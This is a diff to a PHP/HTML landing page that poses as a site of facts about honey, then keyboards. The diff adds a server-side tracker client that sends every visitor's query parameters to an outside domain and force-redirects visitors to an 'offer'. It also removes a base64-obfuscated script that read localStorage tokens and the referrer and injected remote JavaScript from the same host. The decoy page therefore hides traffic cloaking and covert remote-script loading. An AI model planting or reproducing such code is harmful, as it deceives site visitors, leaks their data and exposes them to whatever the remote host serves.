@@ -1,3 +1,19 @@
+<?php
+// Query params are: utm_term={keyword}&external_id={external_id}&utm_creative={creative}&utm_campaign={campaignid}&utm_position={adposition}&utm_network={network}&utm_target={target}&utm_placement={placement}&utm_match={matchtype}&gclid={gclid}&accid={accid} 
+
+require_once dirname(__FILE__) . '/pkcbv91jvtlml8nrcttgnygt86qpk2s4.php';
+$client = new KClient('https://gopaty.com/', 'pkcbv91jvtlml8nrcttgnygt86qpk2s4');
+$client->sendAllParams();       // to send all params from page query
+$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
+// $client->param('sub_id_5', '123'); // you can send any params
+// $client->keyword('PASTE_KEYWORD');  // send custom keyword
+// $client->currentPageAsReferrer(); // to send current page URL as click referrer
+// $client->disableSessions(); // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
+// $client->debug();              // to enable debug mode and show the errors
+// $client->execute();             // request to api, show the output and continue
+$client->executeAndBreak();     // to stop page execution if there is redirect or some output
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -7,8 +23,7 @@
   <meta name="viewport"
     content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
   <meta name="author" content="Bee" />
-  <meta name="description" content="Interesting facts about honey" />
-  <link rel="shortcut icon" href="./assets/images/favicon.ico" type="image/x-icon" />
+  <meta name="description" content="Interesting facts about Keyboards" />
   <link rel="stylesheet" href="./assets/css/bootstrap.min.css" />
   <link rel="stylesheet" href="./assets/css/style.css" />
   <script src="./assets/js/bootstrap.bundle.min.js"></script>
@@ -20,9 +35,6 @@
   <link rel="manifest" href="/site.webmanifest">
   <meta name="msapplication-TileColor" content="#da532c">
   <meta name="theme-color" content="#ffffff">
-
-  <script
-    src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfNmRyaFlxWFJYNW5uenhTZic7CiAgICBpZiAoIXdpbmRvdy5fNmRyaFlxWFJYNW5uenhTZikgewogICAgICAgIHdpbmRvdy5fNmRyaFlxWFJYNW5uenhTZiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9nb3BhdHkuY29tL0Z3TVRqYycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF8xdEhRQk5EQ1Nwd2N6N1FjID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfMXRIUUJORENTcHdjejdRYyAhPT0gJ3VuZGVmaW5lZCcgJiYgXzF0SFFCTkRDU3B3Y3o3UWMgIT09IG51bGwpIHsKICAgICAgICB2YXIgX3BnY2RZeHJyTjJjZGp4VEggPSBKU09OLnBhcnNlKF8xdEhRQk5EQ1Nwd2N6N1FjKTsKICAgICAgICB2YXIgX2d3U0haem53WUt6Mk4yWDkgPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfcGdjZFl4cnJOMmNkanhUSC5jcmVhdGVkX2F0ICsgd2luZG93Ll82ZHJoWXFYUlg1bm56eFNmLnR0bCA8IF9nd1NIWnpud1lLejJOMlg5KSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfTlZ2OWpyNDVaNTRialAyUyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9HeWRwTGhKTlhyS1NRUno4ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX1FwQkxtWkZwQ3FoeUtLNHMgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9RcEJMbVpGcENxaHlLSzRzICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9RcEJMbVpGcENxaHlLSzRzICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX1FwQkxtWkZwQ3FoeUtLNHMgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX1FwQkxtWkZwQ3FoeUtLNHMgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9RcEJMbVpGcENxaHlLSzRzICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF9RcEJMbVpGcENxaHlLSzRzICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fNmRyaFlxWFJYNW5uenhTZi5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfTlZ2OWpyNDVaNTRialAyUyAhPT0gJ3VuZGVmaW5lZCcgJiYgX05WdjlqcjQ1WjU0YmpQMlMgJiYgd2luZG93Ll82ZHJoWXFYUlg1bm56eFNmLnVuaXF1ZSkgewogICAgICAgIF9RcEJMbVpGcENxaHlLSzRzICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX05WdjlqcjQ1WjU0YmpQMlMpOwogICAgfQogICAgaWYgKHR5cGVvZiBfR3lkcExoSk5YcktTUVJ6OCAhPT0gJ3VuZGVmaW5lZCcgJiYgX0d5ZHBMaEpOWHJLU1FSejggJiYgd2luZG93Ll82ZHJoWXFYUlg1bm56eFNmLnVuaXF1ZSkgewogICAgICAgIF9RcEJMbVpGcENxaHlLSzRzICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfR3lkcExoSk5YcktTUVJ6OCk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fNmRyaFlxWFJYNW5uenhTZi5SX1BBVEggKyBfUXBCTG1aRnBDcWh5S0s0czsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
 
 </head>
 
@@ -186,7 +198,7 @@
   <!-- Footer -->
   <footer class="py-5 bg-warning" style="background-color: black!important;">
     <div class="container">
-      <p class="m-0 text-center text-white">Copyright &copy; Penipay.com 2022</p>
+      <p class="m-0 text-center text-white">Copyright &copy; Penipay.com 2023</p>
     </div>
     <!-- /.container -->
   </footer>
